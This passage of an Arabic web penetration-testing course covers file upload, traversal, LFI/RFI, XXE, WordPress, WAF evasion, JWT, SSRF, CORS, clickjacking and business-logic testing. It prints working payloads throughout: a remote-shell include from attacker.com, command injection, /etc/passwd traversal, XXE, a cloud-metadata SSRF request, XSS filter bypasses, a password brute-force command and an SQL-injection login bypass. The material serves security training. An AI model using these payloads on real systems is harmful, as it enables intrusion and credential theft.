X-Content-Type-Options: nosniff	يمنع المتصفح من تخمين نوع المحتوى بشكل خاطئ
Set-Cookie: HttpOnly; Secure	يحمي الكوكيز من الوصول عبر جافاسكريبت ومن الإرسال بدون تشفير

أمثلة: بيانات حساسة ظاهرة في عناوين URLs، في رسائل الخطأ، أو في الكوكيز.

هجمات المصادقة المكسورة (Broken Authentication)
مهاجمة نماذج تسجيل الدخول: تخمين كلمات المرور، استخدام بيانات مسربة، أو استغلال كلمات مرور ضعيفة. لو الموقع مش عامل تحديد للمحاولات أو مش مركب CAPTCHA، بيبقى سهل تهجمه
تجاوز المصادقة: سرقة الجلسات (Session Hijacking)، تعديل طلبات HTTP، أو استغلال أخطاء في التحكم بالوصول (زي تعديل الروابط عشان توصل لأماكن مش مفروض تكون ليك)
اختبار أمان الجلسات
سرقة الجلسات (Session Hijacking): المهاجم بيستغل الكوكيز اللي بتحدد جلستك وياخدها عشان يتحكم في حسابك. بتستخدم Burp Suite لتشوف لو الكوكيز محمية بخصائص زي HttpOnly وSecure
ثبات الجلسة (Session Fixation): المهاجم بيحدد معرف الجلسة قبل ما تسجل دخولك، ولما تدخل بحسابك هو كده بقى عنده نفس المعرف
CSRF: بيحصل لما يخدعك المهاجم عشان تعمل حاجة على موقع أنت مسجل فيه من غير ما تعرف، عشان كده المواقع لازم تستخدم رموز حماية خاصة (CSRF Tokens)

مثال عملي لصفحة CSRF هجومية بسيطة:

html
<!-- <img src="http://example.com/change-password?newpass=hacked123" style="display:none"> -->

(اتحول لكومنت هنا عشان مايبقاش فيه أي طلب فعلي يتنفذ لو الصفحة اتفتحت مباشرة — في السيناريو الفعلي بتشيل الكومنت والصورة بتتحمل تلقائيًا وبتنفذ الطلب).

لو ضحية مسجل دخول على example.com فتح صفحة فيها الكود ده، هيتغير الباسورد بتاعه من غير ما يعمل أي إجراء واعي — والحماية الوحيدة الفعالة هنا وجود CSRF Token بيتغير مع كل طلب.

هجمات الحقن والتحقق من المدخلات
حقن الأوامر (Command Injection): استغلال ثغرات في معالجة مدخلات المستخدم لتشغيل أوامر على النظام
حقن الأكواد (Code Injection): إدخال بيانات ضارة جوا كود الموقع نفسه، وده بيخلي المهاجم يقدر يشغل أكواد على السيرفر

مثال Command Injection:

text
http://example.com/ping?host=8.8.8.8; whoami

لو الفاصلة المنقوطة اتنفذت فعليًا وطلع اسم المستخدم بتاع السيرفر، فيه ثغرة Command Injection مؤكدة.

الاختبار: استخدام Burp Suite's Intruder لحقن بيانات ومراقبة استجابة السيرفر، والتأكد إن التطبيق بيعمل تعقيم للمدخلات (Sanitization).

اختبار تكوينات الأمان الخاطئة

ساعات التطبيقات أو السيرفرات بيكون فيها تكوينات غلط زي إعدادات افتراضية، برامج قديمة، أو خدمات شغالة من غير داعي.

قائمة سريعة للمراجعة:

هل صفحات الخطأ بتكشف تفاصيل تقنية زيادة عن اللزوم (Stack Traces)؟
هل لوحة الإدارة (Admin Panel) متاحة من غير قيود وصول؟
هل فيه ملفات نسخ احتياطي منسية زي .bak أو .old متاحة للتحميل المباشر؟
هل الـ Directory Listing مفعّل ويوري محتوى المجلدات؟

الاختبار: فحص المنافذ المفتوحة والخدمات الغير محتاجة ونسخ البرامج القديمة، باستخدام Nmap وNikto.

أفضل الممارسات: التأكد من الإعدادات الأمنية صح، وقفل كل الخدمة الغير محتاجة، واستخدام إعدادات أمان قوية.

استغلال المكونات الضعيفة وغير المحدثة

لو التطبيق بيستخدم مكتبات أو برامج قديمة، ده بيخليه عرضة للهجمات المعروفة.

الاختبار: استخدام أدوات زي OWASP Dependency-Check للتأكد لو فيه مكونات قديمة ومعروفة إنها فيها ثغرات (CVEs).

الاستغلال: الدوران على ثغرات معروفة في قواعد بيانات الـ CVEs وعمل حمولات (Payloads) تستغلها للهجوم.

07- File & Resource Attacks

السكشن ده بيغطي:

Introduction To Arbitrary File Upload Vulnerabilities
Bypassing File Upload Extension Filters
Bypassing PHPx Blacklists
Introduction To Directory/Path Traversal Vulnerabilities
Identifying & Exploiting Directory/Path Traversal Vulnerabilities
Introduction To LFI & RFI Vulnerabilities
Identifying & Exploiting LFI & RFI Vulnerabilities
مقدمة في ثغرات رفع الملفات العشوائية

الموقع يسمحلك ترفع ملفات، لكن مش بيفحصها كويس — ده ممكن يخلي المهاجم يرفع ملفات خبيثة زي سكربتات PHP، اللي ممكن تنفذ أوامر على السيرفر.

مثال: لو عندك نموذج رفع ملفات مش مطبق فيه حماية قوية، ممكن حد يرفع ملف اسمه shell.php ويستخدمه عشان يتحكم في السيرفر.

تجاوز فلاتر امتداد الملفات

المواقع غالبًا بتحط قيود على أنواع الملفات المسموح بها، زي صور فقط.

إزاي تتجاوزها؟

رفع ملف باسم غير عادي، مثلًا shell.php.jpg، فيبقى شكله كأنه صورة
استخدام "double extension" زي shell.php.gif عشان تخدع السيرفر
تعديل رأس Content-Type في الطلب نفسه (زي إرسال ملف PHP لكن بـ Content-Type: image/jpeg) لو الفحص بيعتمد على الرأس بس مش على محتوى الملف
إضافة Null Byte قديمًا (زي shell.php%00.jpg) — تقنية قديمة اتصلحت في النسخ الحديثة من PHP لكن ممكن تلاقيها لسه في أنظمة قديمة جدًا
تجاوز القوائم السوداء (PHPx Blacklists)

القوائم السوداء بتبقى قائمة بأنواع الملفات الممنوعة، زي ملفات PHP.

تجاوزها: رفع ملف بامتداد مختلف زي .php5 أو .phtml أو .pht، أو استخدام حيل لإخفاء الكود جوا الملف.

Directory/Path Traversal

بتحصل لما الموقع يسمح للمهاجم إنه يوصل لملفات النظام المهمة عن طريق إدخال مسارات غير صحيحة، عادةً بإدخال رموز زي ../ عشان ينتقل لأعلى المجلدات.

التحديد والاستغلال:

text
http://example.com/download?file=../../etc/passwd

لو نجحت، تقدر تقرأ ملفات مهمة أو حتى تنفذ أوامر ضارة على السيرفر.

ترميزات بديلة لو الفلتر البسيط رفض ../ بالظبط:

text
..%2f..%2f..%2fetc%2fpasswd
....//....//....//etc/passwd
LFI و RFI
LFI (Local File Inclusion): تقدر تحمل ملف موجود على السيرفر نفسه
RFI (Remote File Inclusion): تقدر تحمل ملف من الإنترنت — RFI أخطر لأنه بيسمح بتنفيذ كود خبيث من برة السيرفر بالكامل

التحديد والاستغلال:

text
# LFI
index.php?page=../../etc/passwd

# RFI
index.php?page=http://attacker.com/shell.txt
LFI: تقدر تقرأ ملفات مهمة زي /etc/passwd
RFI: تقدر تستخدمها عشان ترفع سكربت ضار وتنفذه عن بعد

PHP Wrappers مفيدة جدًا مع LFI:

الـ Wrapper	الاستخدام
php://filter/convert.base64-encode/resource=index.php	قراءة كود PHP كـ Base64 بدل ما يتنفذ مباشرة
data://text/plain;base64,<كود مشفر>	تنفيذ كود PHP مباشر لو الإعدادات سمحت (allow_url_include)
php://input	تمرير كود من جسم الطلب (Body) نفسه لتنفيذه

مثال عملي متكامل: لقيت باراميتر page في رابط زي http://example.com/index.php?page=about.php بيحمّل صفحات من السيرفر. جربت ?page=../../../../etc/passwd ولقيت محتوى الملف ظاهر في الصفحة — دي ثغرة LFI مؤكدة. عشان أقرأ كود PHP نفسه بدل ما يتنفذ، استخدمت:

text
?page=php://filter/convert.base64-encode/resource=config.php

وفكيت الناتج بـ Base64 عشان أشوف كود التطبيق نفسه، ولقيت فيه بيانات اتصال قاعدة البيانات مكتوبة صريحة.

08- Web Services

السكشن ده بيغطي:

Web Service Implementations
WSDL Language Fundamentals
Web Service Security Testing
SOAP Web Service Security Testing
مقدمة في خدمات الويب

خدمات الويب هي تطبيقات تفاعلية بتتيح نقل البيانات والتفاعل بين أنظمة مختلفة عبر الإنترنت، وبتستخدم بروتوكولات محددة زي HTTP وSOAP وREST.

أنواع خدمات الويب:

SOAP: بتعتمد على XML لتبادل الرسائل وتستخدم بروتوكولات زي HTTP وSMTP
REST: بتعتمد على أساليب HTTP (GET, POST, PUT, DELETE) وتستخدم JSON أو XML لتبادل البيانات

استخداماتها: تطبيقات زي الخدمات المصرفية عبر الإنترنت، منصات التجارة الإلكترونية، وتكامل الأنظمة.

تنفيذ خدمات الويب
مبنية على SOAP: بيتم إنشاء الخدمة باستخدام XML وتُعرَّف في ملف WSDL
مبنية على REST: بتعتمد على بناء API باستخدام HTTP، وغالبًا بتكون بسيطة وسهلة الاستخدام

أمثلة: استخدام خدمات زي Amazon Web Services (AWS) أو Google APIs لدمج وظائف محددة في التطبيقات.

أساسيات لغة WSDL

WSDL هي لغة وصف خدمات الويب، بتحدد إزاي العملاء بيتفاعلوا مع الخدمة.

مكونات WSDL:

Types: تعريف أنواع البيانات المستخدمة في الرسائل
Messages: تعريف البيانات المتبادلة بين العميل والخدمة
Port Type: تحديد العمليات المتاحة في الخدمة
Binding: تحديد بروتوكولات الاتصال والتنسيقات
Service: تحديد عنوان الخدمة ومكان الوصول إليها

مثال مبسط لجزء من ملف WSDL:

xml
<message name="GetUserRequest">
  <part name="userId" type="xsd:int"/>
</message>
<portType name="UserServicePortType">
  <operation name="GetUser">
    <input message="tns:GetUserRequest"/>
    <output message="tns:GetUserResponse"/>
  </operation>
</portType>
اختبار أمان خدمات الويب

خدمات الويب ممكن تكون هدف لهجمات كتير، زي هجمات انتحال الهوية، التلاعب بالرسائل، والاعتماد على معلومات غير موثوقة.

تقنيات الاختبار:

اختبار الضعف: تحديد الثغرات المعروفة في الخدمة
اختبار الولوج: التأكد إن المستخدمين المصرح لهم بس هما اللي يقدروا يوصلوا للوظائف المناسبة
تحليل التهديدات: فحص السيناريوهات المحتملة للهجمات وتقييم المخاطر

أدوات مفيدة للاختبار العملي:

Postman: لبناء وإرسال طلبات REST API يدويًا وتجربة قيم مختلفة
SoapUI: أداة متخصصة لاختبار خدمات SOAP، بتقرأ ملف WSDL وتبني الطلبات تلقائيًا
اختبار أمان خدمات SOAP

SOAP بتعتمد على XML، وده بيخليها عرضة لهجمات زي XML Injection وXXE (XML External Entity).

مثال بسيط على هجوم XXE:

xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<userInfo>
  <name>&xxe;</name>
</userInfo>

لو الـ Parser بتاع XML مش معطل فيه معالجة الـ External Entities، ممكن يرجع محتوى الملف /etc/passwd جوا الرد.

استراتيجيات الاختبار:

تحليل الرسائل: التأكد إن رسائل SOAP مشفرة وآمنة
فحص WSDL: التأكد إن ملفات WSDL مش بتعرض معلومات حساسة
اختبار التوقيع الرقمي: التأكد إن الرسائل موقّعة وبتستخدم SSL/TLS
09- CMS Pentesting

السكشن ده بيغطي:

Introduction To CMS Security Testing
CMS Security Testing Methodology
WordPress Security Testing Methodology
WordPress Information Gathering & Enumeration
WordPress Vulnerability Scanning
WordPress Authentication Attacks
WordPress Plugin Exploitation
WordPress Black-Box Penetration Testing
مقدمة عن أنظمة إدارة المحتوى (CMS)

CMS هي أنظمة بتُستخدم لإنشاء وإدارة المحتوى على الإنترنت بسهولة، من غير الحاجة لكتابة كود. أمثلة: WordPress، Joomla، Drupal.

مزاياها: سهولة الاستخدام، قوالب جاهزة، وإمكانية إضافة ميزات عبر الإضافات (Plugins).

مقدمة في اختبار أمان CMS

CMS هدف شائع للهجمات، لأن مواقع كتيرة جدًا بتستخدمها. الهجمات الممكنة تشمل SQL Injection، XSS، ورفع الملفات الضارة. أهمية الاختبار هنا هي اكتشاف الثغرات قبل ما المهاجمين يستغلوها.

منهجية اختبار أمان CMS
جمع المعلومات: معرفة معلومات عن النظام، الإصدارات، والإضافات المستخدمة
التحليل: تحليل التطبيق بحثًا عن الثغرات المعروفة
الاختبار: تنفيذ اختبارات الأمان زي اختبار الاختراق الفعلي
الإبلاغ: توثيق الثغرات واقتراح حلول
منهجية اختبار أمان WordPress
تحديد الهدف: فهم إزاي WordPress بيشتغل
جمع المعلومات: استخدام أدوات زي WPScan لجمع معلومات عن النسخة، الإضافات، والثيمات
تنفيذ الاختبارات: اختبار الثغرات زي SQL Injection وXSS
جمع المعلومات والتعداد في WordPress
التعرف على النسخة: فحص رؤوس HTTP، واستخدام WPScan
البحث عن الإضافات: معرفة الإضافات المثبتة وإصداراتها
التحقق من المستخدمين: استخدام تقنيات "User Enumeration" للحصول على معلومات عن المستخدمين

تثبيت واستخدام WPScan:

bash
sudo apt install wpscan
bash
wpscan --url http://example.com --enumerate u,vp,vt

أهم فلاجز WPScan:

الفلاج	الوظيفة
--enumerate u	استخراج أسماء المستخدمين
--enumerate vp	استخراج الإضافات القابلة للاستغلال (Vulnerable Plugins)
--enumerate vt	استخراج الثيمات القابلة للاستغلال (Vulnerable Themes)
--api-token <token>	استخدام الـ WPVulnDB API لنتائج أدق وأحدث
--passwords <wordlist>	تجربة Brute Force على المستخدمين المكتشفين
فحص الثغرات في WordPress
WPScan: لفحص الثغرات المعروفة في النسخة، الإضافات، والثيمات
Nessus: لفحص أمان النظام بشكل عام

تحليل النتائج: تحديد الثغرات ذات الأولوية وتوثيقها.

هجمات المصادقة في WordPress
Brute Force: محاولة تخمين كلمات المرور
Credential Stuffing: استخدام بيانات تسجيل دخول مسربة من مواقع تانية

الحماية: تطبيق مصادقة ثنائية (2FA)، واستخدام كلمات مرور قوية.

مثال عملي:

bash
wpscan --url http://example.com --usernames admin --passwords /usr/share/wordlists/rockyou.txt
استغلال إضافات WordPress

كيف يتم الاستغلال؟

ثغرات XSS: لو الإضافة مش بتتأكد من صحة المدخلات
SQL Injection: في حالة ضعف الأمان في استعلامات قاعدة البيانات

أدوات للتحليل: Burp Suite وOWASP ZAP.

مثال عملي: لقيت WPScan بيقول إن الموقع شغال عليه إضافة contact-form-x نسخة قديمة، وفيها ثغرة SQL Injection معروفة (CVE محدد). دورت على الـ Exploit المتاح ليها على Exploit-DB أو استخدمتها مباشرة عبر Metasploit لو متاح موديول جاهز.

اختبار الاختراق الأسود (Black-Box) في WordPress

الاختبار الأسود يعني إنك تبدأ بدون معرفة مسبقة بالبنية الداخلية للنظام.

الخطوات:

جمع المعلومات: استخدام أدوات زي Google Dorking وWPScan
تنفيذ الهجمات: استغلال الثغرات المعروفة أو تنفيذ هجمات SQL
توثيق النتائج: تسجيل الثغرات وأي معلومات حساسة حصلت عليها
نصائح لتحصين WordPress (مفيدة تحطها في تقريرك كتوصيات)
تحديث النواة والإضافات والثيمات بشكل دوري
حذف أي إضافات أو ثيمات غير مستخدمة بدل تعطيلها فقط
إخفاء رقم نسخة WordPress من الكود المصدري الظاهر للعامة
تفعيل مصادقة ثنائية للحسابات الإدارية
تقييد محاولات تسجيل الدخول (Rate Limiting) على wp-login.php
10- Encoding & Filtering

السكشن ده بيغطي:

HTML Encoding
URL Encoding
Base64 Encoding
Bypassing Client-Side Filters
Bypassing Server-Side Filters
Web Application Firewalls (WAF) & Proxies
Evading WAFs, Proxies and IDSs
مقدمة
الترميز (Encoding): تحويل البيانات لصيغة أخرى لتسهيل نقلها أو تخزينها، ولتجنب الفهم غير المقصود للبيانات
التصفية (Filtering): يُستخدم للتحقق من المدخلات ومنع هجمات زي XSS وSQL Injection
التجنب (Evasion): تقنيات يستخدمها المهاجمون لتجاوز أنظمة الأمان (زي WAF) بأساليب غير متوقعة
ترميز HTML

يُستخدم لترميز الحروف الخاصة في HTML (زي <, >, &) إلى رموزها المعروفة (زي &lt;, &gt;, &amp;) لمنع تنفيذ أكواد JavaScript الضارة.

مثال: تحويل النص <script> إلى &lt;script&gt; ليظهر كنص عادي من غير تنفيذ.

ترميز URL

يُستخدم لتحويل الأحرف غير الصالحة في URL لصيغة صالحة، عن طريق استبدال الأحرف غير المتوافقة برموز تمثلها باستخدام %.

مثال: تحويل الفراغ لـ %20، أو رمز # لـ %23.

ترميز Base64

يُستخدم لتحويل البيانات الثنائية لسلسلة نصية من 64 رمز (A-Z, a-z, 0-9, +, /)، وبيُستخدم بشكل شائع في نقل البيانات عبر HTTP.

مثال:

bash
echo -n "Hello" | base64
# SGVsbG8=
تجاوز المرشحات على جانب العميل (Client-Side)
استخدام JavaScript لإدخال بيانات ضارة مباشرة على جانب العميل
استخدام HTML Encoding لإخفاء الأكواد عن أعين المدقق العادي
تعديل الطلب مباشرة عن طريق بروكسي زي Burp بعد ما يتجاوز الفحص اللي بيحصل في المتصفح أصلًا
تجاوز المرشحات على جانب الخادم (Server-Side)
استغلال نقاط الضعف في كيفية معالجة الخادم للبيانات
استخدام SQL Injection لتجاوز تصفية المدخلات
إدخال رموز ترميز غير متوقعة ممكن تتعالج بشكل غلط
جدران حماية تطبيقات الويب (WAF) والوكلاء (Proxies)

WAF هي أنظمة تُستخدم لحماية تطبيقات الويب من هجمات معروفة زي XSS وSQL Injection. الوكلاء (Proxies) بيشتغلوا كوسيط بين المستخدم والخادم.

وظائفها: مراقبة وتحليل حركة البيانات، ومنع الطلبات الضارة بناءً على أنماط معروفة (Signatures).

تقنيات تجاوز WAFs والوكلاء والـ IDS
التقنية	مثال
تغيير حالة الأحرف (Case Manipulation)	<ScRiPt>alert(1)</ScRiPt>
استخدام Payload بديل بنفس التأثير	<img src=x onerror=alert(1)> بدل <script>
ترميز مضاعف (Double Encoding)	ترميز الـ Payload بـ URL Encoding مرتين متتاليتين
التعليقات الوهمية داخل SQL	UNI/**/ON SEL/**/ECT لتقسيم الكلمات المحظورة
تقسيم الـ Payload على أكتر من باراميتر	تمرير جزء من الهجوم في كل حقل والاعتماد على تجميعهم لاحقًا في الكود

مثال عملي على تجاوز فلتر XSS بسيط:

لو الفلتر بيرفض <script> بالظبط، ممكن تجرب:

html
<!-- <ScRiPt>alert(1)</ScRiPt> -->
<!-- <img src=x onerror=alert(1)> -->
<!-- <svg onload=alert(1)> -->

(الأمثلة الثلاثة متعمد تحويلها لكومنتات هنا عشان أمان الصفحة لو اتفتحت مباشرة كـ HTML — في الاختبار الفعلي بتشيل علامات الكومنت وتحقن كل سطر زي ما هو).

كل شكل من دول بيحقق نفس الهدف بطريقة مختلفة، وده بيوضح ليه الاعتماد على فلتر بسيط بيبحث عن كلمة واحدة بالظبط مش كافي أبدًا كحماية حقيقية. الحماية الحقيقية لازم تعتمد على تصفية بناءً على القواعد النحوية (Context-Aware Filtering) مش على قوائم كلمات محظورة بسيطة.

11- API & JWT Security Testing

كتير من التطبيقات الحديثة بقت شغالة بـ APIs في الخلفية (خصوصًا Single Page Applications)، فاختبار أمان الـ API بقى جزء أساسي مش اختياري.

أنواع الـ API الشائعة
النوع	الخصائص
REST	يعتمد على HTTP Methods، بيستخدم JSON غالبًا، الأشهر حاليًا
SOAP	يعتمد على XML، أكتر رسمية وتعقيدًا، شائع في الأنظمة المصرفية والحكومية
GraphQL	استعلام واحد مرن بدل نقاط نهاية متعددة، بيحتاج اختبار مختلف شوية
أهم نقاط الاختبار في REST APIs
Broken Object Level Authorization (BOLA/IDOR): لو غيرت رقم الـ ID في الطلب وقدرت توصل لبيانات مستخدم تاني
Excessive Data Exposure: الـ API بيرجع بيانات أكتر من اللي التطبيق محتاجها فعليًا (زي إرجاع الباسورد المشفر مع بيانات المستخدم)
Lack of Rate Limiting: إمكانية إرسال آلاف الطلبات بدون أي قيد
Mass Assignment: إمكانية تعديل حقول مش مفروض المستخدم العادي يعدلها (زي role أو isAdmin) عن طريق إضافتها للـ JSON المرسل

مثال عملي على IDOR في API:

text
GET /api/users/1042/invoices

لو غيّرت الرقم لـ 1041 وقدرت تشوف فواتير مستخدم تاني من غير أي تحقق من الصلاحية، دي ثغرة IDOR واضحة.

فحص واستكشاف الـ API
Swagger/OpenAPI: لو التطبيق فيه ملف swagger.json أو /api-docs متاح، ده بيدّيك توثيق كامل لكل نقاط النهاية المتاحة من غير أي مجهود تخمين
ffuf / Gobuster: لاكتشاف نقاط نهاية غير موثقة:
bash
  ffuf -u http://example.com/api/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/api/api-endpoints.txt
JWT (JSON Web Tokens) — الهجمات الشائعة

الـ JWT بقى الطريقة الأشهر لإدارة الجلسات في الـ APIs، وبيتكون من 3 أجزاء مفصولة بنقطة: Header.Payload.Signature، وكل جزء مشفّر بـ Base64Url.

نوع الهجوم	الفكرة
None Algorithm Attack	تغيير خوارزمية التوقيع في الـ Header لـ none وحذف التوقيع بالكامل — لو السيرفر مش بيتحقق كويس، بيقبل التوكن
Algorithm Confusion (RS256 → HS256)	تحويل خوارزمية التوقيع من غير متماثلة لمتماثلة، واستخدام المفتاح العام (اللي عادةً متاح للعامة) كمفتاح توقيع سري
Weak Secret Brute-Forcing	لو الـ Secret Key ضعيف، ممكن تكسره بأدوات زي hashcat أو jwt_tool
Signature Stripping	حذف التوقيع بالكامل وترك نقطة فاضية في الآخر

أداة مخصصة: jwt_tool بتساعدك تحلل وتهاجم الـ JWT tokens بشكل آلي:

bash
python3 jwt_tool.py <TOKEN> -T

مثال عملي: فحصت توكن JWT بموقع jwt.io ولقيت الـ Header بيقول "alg": "HS256". جربت أغيّرها لـ "alg": "none" وأحذف التوقيع بالكامل، وبعتت الطلب — لو السيرفر قبل التوكن المعدل من غير أي رفض، يبقى فيه ثغرة None Algorithm خطيرة بتسمح بتزوير أي صلاحيات.

12- SSRF, Insecure Deserialization, CORS & Clickjacking

السكشن ده بيغطي مجموعة ثغرات مهمة موجودة في OWASP Top 10 ومش بتتغطى دايمًا في السكاشن التقليدية، لكنها بتظهر كتير في التطبيقات الحديثة.

Server-Side Request Forgery (SSRF)

بتحصل لما تقدر تخلي السيرفر نفسه يبعت طلب لمكان إنت بتحدده، بدل ما يبعت للمكان المفروض بس.

مثال عملي: لو فيه خاصية "استيراد صورة من رابط" وبتاخد باراميتر url:

text
POST /import-image
url=http://internal-server:8080/admin

لو السيرفر نفذ الطلب ده، تقدر تستخدمه للوصول لخدمات داخلية مش مفروض تكون متاحة من برة الشبكة أصلًا — زي لوحات إدارة داخلية أو حتى Cloud Metadata Endpoints:

text
url=http://169.254.169.254/latest/meta-data/

الرابط ده بالذات بيُستخدم كتير في اختراقات السحابة (AWS/GCP/Azure) لسرقة بيانات اعتماد مؤقتة (Temporary Credentials) خاصة بالسيرفر نفسه.

Insecure Deserialization

بتحصل لما التطبيق بياخد بيانات معقدة (Objects) من مصدر غير موثوق (زي كوكيز أو باراميتر) ويعمل لها Deserialize من غير تحقق، وده ممكن يوصل لتنفيذ كود عن بعد لو اللغة المستخدمة (زي PHP، Java، Python Pickle) بتسمح بده.

علامة شائعة: لو لقيت كوكيز أو باراميتر شكله زي Base64 وبعد فكه بيظهر بداية بحروف زي O: (في PHP) أو rO0 (في Java)، ده مؤشر قوي على وجود Serialized Object.

CORS Misconfiguration

CORS (Cross-Origin Resource Sharing) هو الآلية اللي المتصفح بيستخدمها عشان يقرر لو موقع تاني يقدر يطلب بيانات من الموقع الحالي ولا لأ.

الإعداد الخطير الشائع:

text
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true

الجمع بين الاثنين ده غير منطقي أصلًا (المتصفحات بترفضه)، لكن الإعداد الأخطر عمليًا هو لما السيرفر بيعكس أي Origin المرسل في الطلب على إنه مسموح:

text
Origin: http://evil.com
→ Access-Control-Allow-Origin: http://evil.com
Access-Control-Allow-Credentials: true

هنا أي موقع خبيث يقدر يعمل طلب بالنيابة عن الضحية ويقرأ الرد، لأن المتصفح هيبعت الكوكيز تلقائيًا معاه.

Clickjacking

بتحصل لما موقع خبيث يحمّل الموقع الحقيقي جوا <iframe> شفاف، ويخدع المستخدم إنه يدوس على زرار شكله عادي، بس هو فعليًا بيدوس على زرار حقيقي في الموقع المستهدف (زي "حذف الحساب" أو "تحويل أموال").

التحقق منها:

html
<!-- <iframe src="http://example.com" width="500" height="500"></iframe> -->

(متحول لكومنت هنا عشان الصفحة ميتحملش فيها iframe فعلي بالغلط — في الاختبار الفعلي بتشيل الكومنت وتحط رابط الموقع المستهدف نفسه).

لو الصفحة اتحملت عادي جوا الـ iframe من غير أي مشكلة، الموقع عرضة لـ Clickjacking. الحماية الأساسية هي رأس X-Frame-Options: DENY أو Content-Security-Policy: frame-ancestors 'none'.

13- Business Logic & Rate Limiting

ده النوع اللي مفيش أداة آلية بتلاقيه بسهولة، لأنه مش عن كود فيه خطأ تقني، لكن عن منطق العمل نفسه فيه ثغرة.

أمثلة شائعة على ثغرات منطق العمل
المثال	الشرح
تعديل السعر في طلب الشراء	لو السعر بيتبعت من المتصفح للسيرفر بدل ما يتحسب من السيرفر نفسه، ممكن تعدله لأي رقم
استخدام كوبون خصم أكتر من مرة	لو مفيش تحقق من إن الكوبون اتستخدم قبل كده لنفس الحساب
تجاوز خطوات التحقق (Race Condition)	إرسال نفس الطلب أكتر من مرة في نفس الوقت بالظبط، عشان تستغل الفرق الزمني قبل ما السيرفر يحدّث الحالة
تغيير حالة الطلب يدويًا	زي تغيير حالة طلب من "قيد المراجعة" لـ "مقبول" عن طريق تعديل باراميتر في الطلب مباشرة

مثال عملي: في متجر إلكتروني، لقيت إن طلب الشراء بيبعت الحقول دي:

json
{"product_id": 55, "quantity": 1, "price": 199.99}

لو عدّلت price لـ 1.00 وبعت الطلب، ولو السيرفر قبله من غير ما يتأكد من السعر الحقيقي في قاعدة البيانات، يبقى فيه ثغرة منطقية خطيرة تسمح بشراء منتجات بأي سعر تحدده أنت.

اختبار الـ Rate Limiting
جرب تبعت نفس الطلب (زي محاولة تسجيل دخول أو استخدام كوبون) عدد كبير من المرات في وقت قصير باستخدام Burp Intruder
لو مفيش أي حظر أو تأخير بعد عدد معين من المحاولات، ده بيفتح الباب لهجمات Brute Force وCredential Stuffing غير محدودة

اختبار منطق العمل بيحتاج منك فهم عميق لوظيفة التطبيق نفسه قبل أي حاجة تقنية — مينفعش تشغل أداة آلية وتستنى تطلعلك النتيجة، لازم تفكر زي المستخدم اللي بيحاول يلعب بالنظام.

ملحق: مرجع سريع
المنافذ والخدمات الشائعة في اختبار الويب
المنفذ	الخدمة
80	HTTP
443	HTTPS
8080 / 8000 / 8443	خدمات ويب بديلة أو بروكسيات (زي Burp الافتراضي)
3000	تطبيقات تطوير شائعة (Node.js، React Dev Server)
5000	Flask ومنصات تطوير API شائعة
9000	لوحات إدارة أو خدمات PHP-FPM أحيانًا
أكواد استجابة HTTP المهمة أثناء الاختبار
الكود	المعنى	ليه مهم في البينتيست
200	نجاح الطلب	تأكيد إن المسار أو المورد موجود وشغال
301/302	إعادة توجيه	ممكن يكشف مسارات داخلية أو نطاقات فرعية
401	غير مصرح (محتاج مصادقة)	يوضح إن المورد محمي، مش غير موجود
403	ممنوع	المورد موجود لكن مرفوض الوصول له
500	خطأ داخلي في السيرفر	مؤشر قوي على وجود ثغرة (خصوصًا مع Error-Based SQLi)
مصادر Wordlists الأساسية (متوفرة في مجموعة SecLists)
الاستخدام	المسار الشائع
اكتشاف مجلدات وملفات	/usr/share/wordlists/dirb/common.txt
اكتشاف نطاقات فرعية	/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
كلمات مرور شائعة	/usr/share/wordlists/rockyou.txt
Fuzzing باراميترات	/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt
أدوات Developer Tools في المتصفح — استخدام سريع جدًا
Network Tab: لمراقبة كل الطلبات والاستجابات بدون الحاجة لبروكسي في الفحص السريع
Application Tab: لمراجعة الكوكيز مباشرة وخصائصها (HttpOnly, Secure, SameSite)
Console: لتجربة أكواد JavaScript يدويًا والتحقق من ثغرات DOM-Based XSS بسرعة
ملحق: قالب كتابة تقرير اختبار اختراق

كل ثغرة تكتشفها لازم توثقها بشكل موحد عشان التقرير يبقى مفيد لفريق التطوير. القالب المقترح:

text
## اسم الثغرة
مثال: SQL Injection في نموذج تسجيل الدخول

## الخطورة (Severity)
Critical / High / Medium / Low — ويفضل رقم CVSS لو ممكن

## الوصف
شرح مختصر للثغرة وسياقها في التطبيق

## خطوات إعادة الإنتاج (Steps to Reproduce)
1. اذهب إلى /login
2. أدخل في حقل username: admin' OR '1'='1' --
3. لاحظ الدخول بدون كلمة مرور صحيحة

## الأثر (Impact)
ما الذي يستطيع المهاجم فعله فعليًا بعد استغلال هذه الثغرة

## دليل الإثبات (Proof of Concept)
لقطة شاشة أو طلب/رد HTTP كامل يوضح الاستغلال

## التوصية (Remediation)
استخدام Prepared Statements بدل الاستعلامات الديناميكية

## المراجع (References)
روابط OWASP أو CWE المرتبطة بنوع الثغرة

نصيحة أخيرة: التقرير الجيد بيبقى مفهوم حتى لحد مش بينتستر — يعني مطور أو مدير منتج يقدر يقرأ قسم "الوصف" و"الأثر" ويفهم خطورة المشكلة، حتى لو مفهمش تفاصيل "خطوات إعادة الإنتاج" التقنية بالكامل.

الخلاصة

كدا غطينا الكورس بالكامل — من مقدمة عن اختبار أمان تطبيقات الويب، مرورًا بجمع المعلومات، البروكسيات، أخطر الثغرات (XSS، SQL Injection)، الهجمات الشائعة على المصادقة والجلسات، ثغرات الملفات والمسارات، أمان خدمات الويب، اختبار أمان الـ CMS وWordPress بالتفصيل، الترميز والتصفية وتقنيات التجاوز، وصولًا لأمان الـ APIs والـ JWT، الثغرات الأحدث زي SSRF وCORS Misconfiguration وClickjacking، وأخيرًا اختبار منطق العمل (Business Logic) اللي محدش بيديله حقه غالبًا رغم خطورته.